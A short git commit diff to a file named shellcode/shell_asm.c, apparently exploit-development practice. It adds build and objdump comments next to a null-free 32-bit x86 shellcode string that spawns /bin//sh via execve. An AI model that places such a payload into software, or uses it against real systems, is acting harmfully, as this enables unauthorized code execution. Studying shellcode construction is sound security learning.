8ad7115d18dcc44d5a2665e097b3971c92bd5a7e
M4x <aboultraman@gmail.com>
2017-11-29 18:05:24 +0800

    write shellcode without \x00

--- shellcode/shell_asm.c
+++ shellcode/shell_asm.c
@@ -15,6 +15,8 @@
 			/* "int 0x80;" */
 			/* ); */
 /* } */
+/* gcc shell_asm.c -m32 -masm=intel -o shell_asm */
+/* objdump -d ./shell_asm| cut -f2 > shellcode */
 
 char *shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb8\xff\xff\xff\xff\x83\xe8\xf4\xcd\x80";
 
